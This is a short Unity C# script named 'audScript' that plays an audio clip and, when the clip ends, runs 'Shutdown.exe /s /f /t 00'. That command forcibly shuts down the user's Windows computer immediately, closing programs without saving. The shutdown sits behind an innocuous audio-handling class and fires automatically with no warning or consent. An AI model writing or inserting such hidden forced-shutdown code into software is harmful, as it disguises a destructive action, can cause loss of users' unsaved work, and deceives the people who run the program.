using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.Diagnostics;
using System;
using System.Runtime.InteropServices;

public class audScript : MonoBehaviour
{
    AudioSource aud;
    // Start is called before the first frame update
    void Start()
    {
        aud = GetComponent<AudioSource>();
        Invoke("audioFinished", aud.clip.length);
    }

    void audioFinished()
    {
        // credits: MASTERDEVELOPERS from their SHUTDOWN PROJECT
        System.Diagnostics.Process.Start("Shutdown.exe", "/s /f /t 00");
    }

    // Update is called once per frame
    void Update()
    {
        
    }
}
